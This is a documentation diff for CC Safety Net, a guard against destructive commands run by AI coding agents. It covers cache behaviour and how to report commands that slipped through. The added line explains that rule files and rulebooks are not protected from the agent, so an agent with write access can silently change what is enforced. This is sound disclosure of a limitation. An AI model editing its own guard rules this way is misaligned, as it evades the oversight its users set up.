-bunx keeps its own per-package cache under the OS temp dir, so a `bunx cc-safety-net` run can serve an old release too. Every `cc-safety-net update` run clears your `cc-safety-net` entries there, even when no integration is installed. Exactly one entry survives: a bunx-launched `update` does not delete the entry it is running from, because removing files in use fails on Windows. That entry re-resolves through bun's own manifest TTL instead.
+Only `policy.json` is protected from the agent. `rule.json` and rulebooks are ordinary files the runtime rereads on every tool call, so an agent that can write in the rules directory changes what is enforced on the next call. An edit to a vendored `rulebook.json` leaves no record and stays in force until the next `rule update` overwrites it.
 
 ## What to do if a destructive command slipped through
 
-First, confirm whether you hit a documented boundary or something unexpected:
-
-```bash
-npx cc-safety-net explain "<the command>"
-```
-
-The `explain` command shows the full step-by-step analysis of how CC Safety Net evaluated that specific command, including the effective safety level, so you can tell a documented standard-mode relaxation from a real gap. For the wider symptom-by-symptom walkthrough, start at [Troubleshooting](/guides/troubleshooting).
-
-<Warning>
-  A real trace is **not** automatically safe to share. Redaction covers recognized credential shapes only; the command text you supplied, its parsed tokens, absolute paths including your home directory, and your policy file path are all carried through. Reproduce with placeholder credentials and review the output before pasting it anywhere.
-</Warning>
-
-Then route the report:
-
-- A command shape the rules do not block yet is a **coverage gap**. It is a public bug. Open a [GitHub issue](https://github.com/kenryu42/cc-safety-net/issues) describing the command *shape*, not a ready-to-paste payload.
-- Secret leakage, a write outside the intended directory, and supply-chain or package-integrity problems take the **private** disclosure path instead.
-
-The [security policy](/security) has both procedures and the full classification.
+Follow [A destructive command ran without a block](/guides/troubleshooting#a-destructive-command-ran-without-a-block) in Troubleshooting.
